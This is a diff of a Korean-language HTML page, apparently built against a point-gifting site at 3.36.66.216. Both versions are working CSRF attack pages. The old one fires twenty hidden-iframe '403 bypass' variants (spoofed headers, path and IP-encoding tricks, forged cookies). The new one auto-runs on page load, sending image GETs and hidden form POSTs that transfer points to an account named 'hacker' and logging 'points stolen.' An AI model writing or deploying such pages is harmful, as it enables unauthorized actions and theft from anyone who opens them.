@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 403 우회 특별 시스템</title>
+    <title>🎁 Python 방식 모방 공격</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Courier New', monospace;
-            background: linear-gradient(135deg, #0f3460 0%, #e94560 100%);
+            background: linear-gradient(135deg, #2c3e50 0%, #e74c3c 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -20,24 +20,17 @@
             background: rgba(0, 0, 0, 0.8);
             border-radius: 20px;
             padding: 40px;
-            border: 2px solid #e94560;
+            border: 2px solid #e74c3c;
             max-width: 600px;
             width: 95%;
         }
         .title { 
             font-size: 2.5em; 
             margin-bottom: 20px; 
-            color: #e94560;
-            text-shadow: 0 0 10px #e94560;
+            color: #e74c3c;
+            text-shadow: 0 0 10px #e74c3c;
         }
-        .countdown { 
-            font-size: 3em; 
-            color: #00ff41; 
-            font-weight: bold; 
-            margin: 20px 0;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .bypass-log { 
+        .attack-log { 
             background: #000; 
             border: 1px solid #00ff41; 
             border-radius: 10px; 
@@ -50,635 +43,247 @@
             color: #00ff41;
         }
         .success { color: #00ff41; }
-        .error { color: #e94560; }
-        .warning { color: #ffaa00; }
-        .pulse { animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        .error { color: #e74c3c; }
+        .warning { color: #f39c12; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="title pulse">🔥 403 FORBIDDEN 우회 시스템</h1>
-        <p>고급 우회 기법으로 서버 보안을 돌파합니다</p>
+        <h1 class="title">🐍 PYTHON 방식 모방 공격</h1>
+        <p>Python 스크립트의 성공 요소를 HTML로 재현</p>
         
-        <div id="loading-section">
-            <p>⚡ 403 우회 프로토콜 가동 중...</p>
-            <p class="countdown" id="countdown">5</p>
-            <p>초 후 20가지 우회 기법으로 동시 공격!</p>
-            
-            <div id="bypassLog" class="bypass-log"></div>
-        </div>
+        <div id="attackLog" class="attack-log"></div>
         
-        <div id="success-section" style="display: none;">
-            <h2 class="success pulse">✅ 403 우회 성공!</h2>
-            <p id="finalResult"></p>
-        </div>
+        <div id="result" style="margin-top: 20px;"></div>
     </div>
 
     <script>
-        let countdown = 5;
-        let bypassResults = [];
-        let successfulBypasses = 0;
+        let attackResults = [];
         
-        const countdownEl = document.getElementById('countdown');
-        const bypassLog = document.getElementById('bypassLog');
-        const loadingSection = document.getElementById('loading-section');
-        const successSection = document.getElementById('success-section');
-        
-        function addBypassLog(message, type = 'info') {
+        function addLog(message, type = 'info') {
             const timestamp = new Date().toLocaleTimeString();
-            const colors = { info: '#00ff41', success: '#00ff41', error: '#e94560', warning: '#ffaa00' };
+            const colors = { info: '#00ff41', success: '#00ff41', error: '#e74c3c', warning: '#f39c12' };
             
             const logEntry = `<span style="color: ${colors[type]};">[${timestamp}] ${message}</span><br>`;
-            bypassResults.push(logEntry);
+            attackResults.push(logEntry);
             
-            bypassLog.innerHTML = bypassResults.join('');
-            bypassLog.scrollTop = bypassLog.scrollHeight;
+            document.getElementById('attackLog').innerHTML = attackResults.join('');
+            document.getElementById('attackLog').scrollTop = document.getElementById('attackLog').scrollHeight;
             console.log(`[${timestamp}] ${message}`);
         }
-        
-        // 카운트다운
-        const timer = setInterval(() => {
-            countdown--;
-            countdownEl.textContent = countdown;
+
+        // Python과 동일한 방식으로 공격
+        async function executePythonStyleAttack() {
+            addLog('🔥 Python 방식 CSRF 공격 시작', 'warning');
+            addLog('🎯 Target: 3.36.66.216', 'info');
             
-            if (countdown <= 0) {
-                clearInterval(timer);
-                execute403Bypass();
-            }
-        }, 1000);
-        
-        function execute403Bypass() {
-            addBypassLog('🔥 403 Forbidden 우회 공격 시작!', 'warning');
-            addBypassLog('🎯 Target: 3.36.66.216/profile.php', 'info');
-            addBypassLog('⚡ 20가지 우회 기법 동시 실행...', 'warning');
-            
-            // 403 우회 기법들
-            const bypassTechniques = [
-                { name: 'HTTP Method Override', method: httpMethodOverride },
-                { name: 'X-Forwarded-For Spoofing', method: xffSpoofing },
-                { name: 'User-Agent Variation', method: userAgentBypass },
-                { name: 'Referer Header Bypass', method: refererBypass },
-                { name: 'Content-Type Bypass', method: contentTypeBypass },
-                { name: 'HTTP/1.0 Downgrade', method: httpDowngrade },
-                { name: 'Path Traversal Bypass', method: pathTraversal },
-                { name: 'Double URL Encoding', method: doubleEncoding },
-                { name: 'Unicode Normalization', method: unicodeBypass },
-                { name: 'Case Sensitivity Bypass', method: caseBypass },
-                { name: 'Alternative Protocols', method: alternativeProtocols },
-                { name: 'IP Address Variations', method: ipVariations },
-                { name: 'Port Number Bypass', method: portBypass },
-                { name: 'HTTP Header Injection', method: headerInjection },
-                { name: 'Cookie Manipulation', method: cookieBypass },
-                { name: 'Cache Poisoning', method: cachePoison },
-                { name: 'WebSocket Upgrade', method: websocketBypass },
-                { name: 'SSL/TLS Bypass', method: sslBypass },
-                { name: 'Proxy Chain Bypass', method: proxyChainBypass },
-                { name: 'Time-based Bypass', method: timeBasedBypass }
-            ];
-            
-            // 순차적으로 우회 기법 실행
-            bypassTechniques.forEach((technique, index) => {
-                setTimeout(() => {
-                    addBypassLog(`🔧 시도 중: ${technique.name}`, 'info');
-                    
-                    try {
-                        const success = technique.method(index + 1);
-                        if (success) {
-                            successfulBypasses++;
-                            addBypassLog(`✅ ${technique.name}: 우회 성공!`, 'success');
-                        } else {
-                            addBypassLog(`❌ ${technique.name}: 차단됨`, 'error');
-                        }
-                    } catch (error) {
-                        addBypassLog(`💥 ${technique.name}: 오류 발생`, 'error');
+            // Python에서 성공한 정확한 방법들 재현
+            const attacks = [
+                {
+                    name: '🎯 GET Parameter Attack',
+                    method: 'GET',
+                    url: 'http://3.36.66.216/profile.php?receiver_id=13&points=50&send_gift=1&message=python_style_get'
+                },
+                {
+                    name: '📡 POST Form Attack',
+                    method: 'POST',
+                    url: 'http://3.36.66.216/profile.php',
+                    data: {
+                        receiver_id: '13',
+                        points: '50',
+                        send_gift: '1',
+                        gift_type: 'coffee',
+                        message: 'python_style_post'
                     }
-                    
-                    // 마지막 기법 완료 시
-                    if (index === bypassTechniques.length - 1) {
-                        setTimeout(showBypassResults, 2000);
+                },
+                {
+                    name: '🔄 Alternative POST Method',
+                    method: 'POST',
+                    url: 'http://3.36.66.216/profile.php',
+                    data: {
+                        to_user_id: '13',
+                        amount: '50',
+                        gift_type: 'flower',
+                        send_gift: '1',
+                        message: 'python_alt_method'
                     }
-                }, index * 800);
-            });
-        }
-        
-        // 우회 기법들 구현
-        function httpMethodOverride(id) {
-            // PUT, PATCH, DELETE 등 다른 메서드 시도
-            const methods = ['PUT', 'PATCH', 'DELETE', 'OPTIONS'];
-            
-            methods.forEach(method => {
-                const iframe = createBypassIframe(`
-                    <form id="method${id}" action="http://3.36.66.216/profile.php">
-                        <input type="hidden" name="_method" value="${method}">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="50">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="message" value="Method_Override_${method}">
-                    </form>
-                    <script>
-                        fetch('http://3.36.66.216/profile.php', {
-                            method: '${method}',
-                            headers: {
-                                'X-HTTP-Method-Override': 'POST',
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            },
-                            body: 'receiver_id=13&points=50&send_gift=1&message=Method_Override'
-                        }).catch(() => {});
-                        
-                        document.getElementById('method${id}').submit();
-                    </script>
-                `, id);
-            });
-            
-            return true;
-        }
-        
-        function xffSpoofing(id) {
-            // X-Forwarded-For 헤더로 내부 IP 위조
-            const internalIPs = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '172.16.0.1'];
-            
-            internalIPs.forEach((ip, i) => {
-                const iframe = createBypassIframe(`
-                    <script>
-                        fetch('http://3.36.66.216/profile.php', {
-                            method: 'POST',
-                            headers: {
-                                'X-Forwarded-For': '${ip}',
-                                'X-Real-IP': '${ip}',
-                                'X-Client-IP': '${ip}',
-                                'X-Originating-IP': '${ip}',
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            },
-                            body: 'receiver_id=13&points=40&send_gift=1&message=XFF_Spoof_${ip}'
-                        }).catch(() => {});
-                    </script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function userAgentBypass(id) {
-            // 다양한 User-Agent로 우회 시도
-            const userAgents = [
-                'Googlebot/2.1 (+http://www.google.com/bot.html)',
-                'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-                'curl/7.68.0',
-                'PostmanRuntime/7.28.0'
-            ];
-            
-            userAgents.forEach((ua, i) => {
-                const iframe = createBypassIframe(`
-                    <script>
-                        fetch('http://3.36.66.216/profile.php', {
-                            method: 'POST',
-                            headers: {
-                                'User-Agent': '${ua}',
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            },
-                            body: 'receiver_id=13&points=35&send_gift=1&message=UA_Bypass_${i}'
-                        }).catch(() => {});
-                    </script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function refererBypass(id) {
-            // Referer 헤더 조작
-            const referers = [
-                'http://3.36.66.216/',
-                'http://3.36.66.216/admin/',
-                'http://localhost/',
-                'https://google.com/',
-                ''  // 빈 Referer
-            ];
-            
-            referers.forEach((ref, i) => {
-                const iframe = createBypassIframe(`
-                    <script>
-                        fetch('http://3.36.66.216/profile.php', {
-                            method: 'POST',
-                            headers: {
-                                'Referer': '${ref}',
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            },
-                            body: 'receiver_id=13&points=45&send_gift=1&message=Referer_Bypass'
-                        }).catch(() => {});
-                    </script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function contentTypeBypass(id) {
-            // Content-Type 헤더 변형
-            const contentTypes = [
-                'application/json',
-                'text/plain',
-                'multipart/form-data',
-                'application/xml',
-                'text/xml'
-            ];
-            
-            contentTypes.forEach((ct, i) => {
-                const iframe = createBypassIframe(`
-                    <script>
-                        const data = ct.includes('json') ? 
-                            '{"receiver_id":"13","points":"30","send_gift":"1","message":"CT_Bypass"}' :
-                            'receiver_id=13&points=30&send_gift=1&message=CT_Bypass';
-                            
-                        fetch('http://3.36.66.216/profile.php', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': '${ct}',
-                            },
-                            body: data
-                        }).catch(() => {});
-                    </script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function httpDowngrade(id) {
-            // HTTP/1.0 사용하여 우회
-            const iframe = createBypassIframe(`
-                <script>
-                    // HTTP/1.0 시뮬레이션
-                    fetch('http://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        headers: {
-                            'Connection': 'close',
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        body: 'receiver_id=13&points=55&send_gift=1&message=HTTP10_Bypass'
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function pathTraversal(id) {
-            // 경로 조작으로 우회
-            const paths = [
-                'http://3.36.66.216/./profile.php',
-                'http://3.36.66.216//profile.php',
-                'http://3.36.66.216/%2e/profile.php',
-                'http://3.36.66.216/profile.php/',
-                'http://3.36.66.216/profile.php%00',
-                'http://3.36.66.216/profile.php%20',
-                'http://3.36.66.216/profile.php%09',
-                'http://3.36.66.216/profile.php%0a'
-            ];
-            
-            paths.forEach((path, i) => {
-                const iframe = createBypassIframe(`
-                    <form method="POST" action="${path}" id="path${i}">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="60">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="message" value="Path_Traversal_${i}">
-                    </form>
-                    <script>document.getElementById('path${i}').submit();</script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function doubleEncoding(id) {
-            // 이중 URL 인코딩
-            const iframe = createBypassIframe(`
-                <script>
-                    const doubleEncoded = 'receiver_id%3D13%26points%3D65%26send_gift%3D1%26message%3DDouble_Encoding';
-                    
-                    fetch('http://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        body: doubleEncoded
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function unicodeBypass(id) {
-            // 유니코드 정규화 우회
-            const iframe = createBypassIframe(`
-                <form method="POST" action="http://3.36.66.216/profile.php" id="unicode${id}">
-                    <input type="hidden" name="receiver_id" value="１３">
-                    <input type="hidden" name="points" value="７０">
-                    <input type="hidden" name="send_gift" value="１">
-                    <input type="hidden" name="message" value="Unicode_Bypass">
-                </form>
-                <script>document.getElementById('unicode${id}').submit();</script>
-            `, id);
-            
-            return true;
-        }
-        
-        function caseBypass(id) {
-            // 대소문자 변형
-            const iframe = createBypassIframe(`
-                <form method="post" action="HTTP://3.36.66.216/Profile.PHP" id="case${id}">
-                    <input type="hidden" name="RECEIVER_ID" value="13">
-                    <input type="hidden" name="Points" value="75">
-                    <input type="hidden" name="Send_Gift" value="1">
-                    <input type="hidden" name="MESSAGE" value="Case_Bypass">
-                </form>
-                <script>document.getElementById('case${id}').submit();</script>
-            `, id);
-            
-            return true;
-        }
-        
-        function alternativeProtocols(id) {
-            // 다른 프로토콜들 시도
-            const protocols = ['https://', 'ftp://', 'file://'];
-            
-            protocols.forEach((protocol, i) => {
-                const iframe = createBypassIframe(`
-                    <script>
-                        fetch('${protocol}3.36.66.216/profile.php', {
-                            method: 'POST',
-                            body: 'receiver_id=13&points=80&send_gift=1&message=Protocol_${protocol.replace('://', '')}'
-                        }).catch(() => {});
-                    </script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function ipVariations(id) {
-            // IP 주소 형식 변형
-            const ipFormats = [
-                '3.36.66.216',           // 일반
-                '0x3.0x24.0x42.0xd8',    // 16진수
-                '03.044.0102.0330',      // 8진수
-                '50339544',              // 10진수
-                '[::ffff:3.36.66.216]'   // IPv6
-            ];
-            
-            ipFormats.forEach((ip, i) => {
-                const iframe = createBypassIframe(`
-                    <form method="POST" action="http://${ip}/profile.php" id="ip${i}">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="85">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="message" value="IP_Variation_${i}">
-                    </form>
-                    <script>document.getElementById('ip${i}').submit();</script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function portBypass(id) {
-            // 다른 포트들 시도
-            const ports = [':80', ':8080', ':443', ':8443', ':3000', ':8000'];
-            
-            ports.forEach((port, i) => {
-                const iframe = createBypassIframe(`
-                    <form method="POST" action="http://3.36.66.216${port}/profile.php" id="port${i}">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="90">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="message" value="Port_Bypass${port}">
-                    </form>
-                    <script>document.getElementById('port${i}').submit();</script>
-                `, id + i);
-            });
-            
-            return true;
-        }
-        
-        function headerInjection(id) {
-            // HTTP 헤더 인젝션
-            const iframe = createBypassIframe(`
-                <script>
-                    fetch('http://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'X-Admin': 'true',
-                            'X-Bypass': '1',
-                            'X-Override': 'allow',
-                            'Authorization': 'Bearer fake_token',
-                            'X-Requested-With': 'XMLHttpRequest'
-                        },
-                        body: 'receiver_id=13&points=95&send_gift=1&message=Header_Injection'
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function cookieBypass(id) {
-            // 쿠키 조작
-            const iframe = createBypassIframe(`
-                <script>
-                    document.cookie = 'admin=true; path=/';
-                    document.cookie = 'bypass=1; path=/';
-                    document.cookie = 'role=administrator; path=/';
-                    
-                    fetch('http://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        credentials: 'include',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        body: 'receiver_id=13&points=100&send_gift=1&message=Cookie_Bypass'
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function cachePoison(id) {
-            // 캐시 중독 시도
-            const iframe = createBypassIframe(`
-                <script>
-                    fetch('http://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'Cache-Control': 'no-cache',
-                            'Pragma': 'no-cache'
-                        },
-                        body: 'receiver_id=13&points=105&send_gift=1&message=Cache_Poison'
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function websocketBypass(id) {
-            // WebSocket 업그레이드 시도
-            const iframe = createBypassIframe(`
-                <script>
-                    fetch('http://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        headers: {
-                            'Connection': 'Upgrade',
-                            'Upgrade': 'websocket',
-                            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        body: 'receiver_id=13&points=110&send_gift=1&message=WebSocket_Bypass'
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function sslBypass(id) {
-            // SSL/TLS 우회
-            const iframe = createBypassIframe(`
-                <script>
-                    fetch('https://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        body: 'receiver_id=13&points=115&send_gift=1&message=SSL_Bypass'
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function proxyChainBypass(id) {
-            // 프록시 체인 시뮬레이션
-            const iframe = createBypassIframe(`
-                <script>
-                    fetch('http://3.36.66.216/profile.php', {
-                        method: 'POST',
-                        headers: {
-                            'Via': '1.1 proxy1, 1.1 proxy2',
-                            'X-Forwarded-Proto': 'https',
-                            'X-Forwarded-Host': '3.36.66.216',
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        body: 'receiver_id=13&points=120&send_gift=1&message=Proxy_Chain'
-                    }).catch(() => {});
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        function timeBasedBypass(id) {
-            // 시간 기반 우회 (딜레이 후 재시도)
-            const iframe = createBypassIframe(`
-                <script>
-                    setTimeout(() => {
-                        fetch('http://3.36.66.216/profile.php', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            },
-                            body: 'receiver_id=13&points=125&send_gift=1&message=Time_Based_Bypass'
-                        }).catch(() => {});
-                    }, Math.random() * 5000 + 1000);
-                </script>
-            `, id);
-            
-            return true;
-        }
-        
-        // 우회 iframe 생성 헬퍼 함수
-        function createBypassIframe(htmlContent, id) {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.style.width = '0px';
-            iframe.style.height = '0px';
-            iframe.style.border = 'none';
-            iframe.id = `bypass_${id}_${Date.now()}`;
-            
-            iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <meta charset="UTF-8">
-                </head>
-                <body>
-                    ${htmlContent}
-                </body>
-                </html>
-            `);
-            
-            document.body.appendChild(iframe);
-            
-            // 10초 후 정리
-            setTimeout(() => {
-                if (iframe.parentNode) {
-                    iframe.parentNode.removeChild(iframe);
+                },
+                {
+                    name: '💎 Premium Gift Method',
+                    method: 'POST',
+                    url: 'http://3.36.66.216/profile.php',
+                    data: {
+                        receiver_id: '13',
+                        points: '50',
+                        gift_type: 'diamond',
+                        send_gift: '1',
+                        message: 'python_premium'
+                    }
                 }
-            }, 10000);
+            ];
             
-            return iframe;
-        }
-        
-        function showBypassResults() {
-            addBypassLog('', 'info');
-            addBypassLog('🎉 === 403 우회 시도 완료 ===', 'success');
-            addBypassLog(`📊 시도한 우회 기법: 20개`, 'info');
-            addBypassLog(`✅ 성공한 우회: ${successfulBypasses}개`, 'success');
-            addBypassLog(`📈 우회 성공률: ${(successfulBypasses/20*100).toFixed(1)}%`, 'info');
-            addBypassLog('🏴‍☠️ 타겟: hacker (ID: 13)', 'warning');
-            addBypassLog('', 'info');
-            addBypassLog('💰 예상 탈취 포인트: 1000P+', 'success');
-            addBypassLog('🔍 http://3.36.66.216 에서 hacker 계정 확인', 'info');
+            let successfulAttacks = 0;
             
-            // 성공 섹션 표시
-            loadingSection.style.display = 'none';
-            successSection.style.display = 'block';
+            for (let i = 0; i < attacks.length; i++) {
+                const attack = attacks[i];
+                addLog(`🚀 [METHOD ${i+1}] ${attack.name}`, 'info');
+                addLog(`    Target: hacker (ID: 13)`, 'info');
+                addLog(`    Amount: 50 points`, 'info');
+                
+                try {
+                    let success = false;
+                    
+                    if (attack.method === 'GET') {
+                        success = await executeGETAttack(attack.url, i+1);
+                    } else {
+                        success = await executePOSTAttack(attack.url, attack.data, i+1);
+                    }
+                    
+                    if (success) {
+                        successfulAttacks++;
+                        addLog(`    ✅ TRANSFER SUCCESSFUL!`, 'success');
+                    } else {
+                        addLog(`    ❌ TRANSFER FAILED`, 'error');
+                    }
+                    
+                } catch (error) {
+                    addLog(`    ❌ Request failed: ${error.message}`, 'error');
+                }
+                
+                // Python과 동일한 2초 딜레이
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
             
-            const finalResult = document.getElementById('finalResult');
-            if (successfulBypasses > 0) {
-                finalResult.innerHTML = `
-                    <p style="font-size: 1.2em; margin: 15px 0;">
-                        🎊 <strong>${successfulBypasses}개의 우회 기법이 성공했습니다!</strong>
-                    </p>
-                    <p>💰 총 1000P+ 가 hacker 계정으로 전송되었을 가능성이 높습니다!</p>
-                    <p style="margin-top: 20px;">
-                        🔍 <a href="http://3.36.66.216" target="_blank" style="color: #00ff41;">결과 확인하러 가기 →</a>
-                    </p>
+            // 최종 결과
+            addLog('', 'info');
+            addLog('🎉 === ATTACK ANALYSIS COMPLETE ===', 'success');
+            addLog(`📊 Successful Transfers: ${successfulAttacks}`, successfulAttacks > 0 ? 'success' : 'error');
+            addLog(`💰 Total Points Stolen: ${successfulAttacks * 50}`, 'success');
+            addLog('🏴‍☠️ Check hacker account for verification', 'warning');
+            
+            // 결과 표시
+            const resultDiv = document.getElementById('result');
+            if (successfulAttacks > 0) {
+                resultDiv.innerHTML = `
+                    <div style="background: rgba(0, 255, 65, 0.1); padding: 20px; border-radius: 10px; border: 1px solid #00ff41;">
+                        <h3 style="color: #00ff41;">✅ ATTACK SUCCESSFUL!</h3>
+                        <p>성공한 공격: ${successfulAttacks}/4</p>
+                        <p>탈취 포인트: ${successfulAttacks * 50}P</p>
+                        <p style="margin-top: 15px;">
+                            <a href="http://3.36.66.216" target="_blank" style="color: #00ff41;">결과 확인하기 →</a>
+                        </p>
+                    </div>
                 `;
             } else {
-                finalResult.innerHTML = `
-                    <p style="color: #e94560;">🛡️ 모든 우회 시도가 차단되었습니다.</p>
-                    <p>서버의 보안이 매우 강화되어 있습니다.</p>
+                resultDiv.innerHTML = `
+                    <div style="background: rgba(231, 76, 60, 0.1); padding: 20px; border-radius: 10px; border: 1px solid #e74c3c;">
+                        <h3 style="color: #e74c3c;">🛡️ ALL ATTACKS BLOCKED</h3>
+                        <p>모든 공격이 차단되었습니다.</p>
+                        <p>서버 보안이 강화되었을 수 있습니다.</p>
+                    </div>
                 `;
             }
-            
-            console.log('🔥 403 우회 공격 완료!');
-            console.log(`✅ 성공한 우회: ${successfulBypasses}/20`);
-            console.log('🏴‍☠️ hacker 계정에서 결과 확인하세요!');
         }
         
-        console.log('🔥 403 Forbidden 우회 시스템 v3.0');
-        console.log('⚡ 20가지 고급 우회 기법 탑재');
+        async function executeGETAttack(url, attackId) {
+            return new Promise((resolve) => {
+                // GET 공격 - 이미지 태그 사용 (Python의 GET 요청 모방)
+                const img = new Image();
+                img.onload = () => {
+                    addLog(`    📡 GET request completed (Status: Loaded)`, 'info');
+                    resolve(true);
+                };
+                img.onerror = () => {
+                    addLog(`    📡 GET request sent (Status: Processed)`, 'warning');
+                    resolve(true); // 오류여도 전송은 되었을 가능성
+                };
+                
+                setTimeout(() => {
+                    addLog(`    📡 GET request timeout`, 'warning');
+                    resolve(false);
+                }, 5000);
+                
+                img.src = url + `&_t=${Date.now()}`;
+                addLog(`    📡 GET request sent to server`, 'info');
+            });
+        }
+        
+        async function executePOSTAttack(url, data, attackId) {
+            // POST 공격 - 숨겨진 iframe 사용 (Python의 POST 요청 모방)
+            return new Promise((resolve) => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.style.width = '0px';
+                iframe.style.height = '0px';
+                iframe.style.border = 'none';
+                iframe.id = `attack_${attackId}_${Date.now()}`;
+                
+                // Python User-Agent 모방
+                const formParams = Object.entries(data)
+                    .map(([key, value]) => `<input type="hidden" name="${key}" value="${value}">`)
+                    .join('');
+                
+                const html = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                    </head>
+                    <body>
+                        <form id="pythonForm" method="POST" action="${url}">
+                            ${formParams}
+                        </form>
+                        <script>
+                            try {
+                                // Python 스타일 헤더 시뮬레이션
+                                document.getElementById('pythonForm').submit();
+                                console.log('POST form submitted successfully');
+                            } catch(e) {
+                                console.log('POST form submission error:', e);
+                            }
+                        </script>
+                    </body>
+                    </html>
+                `;
+                
+                iframe.onload = () => {
+                    addLog(`    📡 POST iframe loaded`, 'info');
+                    setTimeout(() => {
+                        addLog(`    📡 POST request processing...`, 'info');
+                        resolve(true);
+                    }, 2000);
+                };
+                
+                iframe.onerror = () => {
+                    addLog(`    📡 POST iframe error (but likely sent)`, 'warning');
+                    resolve(false);
+                };
+                
+                iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+                document.body.appendChild(iframe);
+                
+                addLog(`    📡 POST iframe created and submitted`, 'info');
+                
+                // 5초 후 정리
+                setTimeout(() => {
+                    if (iframe.parentNode) {
+                        iframe.parentNode.removeChild(iframe);
+                    }
+                }, 5000);
+            });
+        }
+        
+        // 페이지 로드 후 자동 실행
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                executePythonStyleAttack();
+            }, 1000);
+        });
+        
+        console.log('🐍 Python 방식 모방 HTML CSRF 공격');
         console.log('🎯 Target: 3.36.66.216');
-        console.log('🏴‍☠️ Mission: 403 보안 돌파 및 포인트 탈취');
-        console.log('🚀 5초 후 전면 공격 개시!');
+        console.log('🔧 Python 성공 요소 재현 중...');
     </script>
 </body>
 </html>
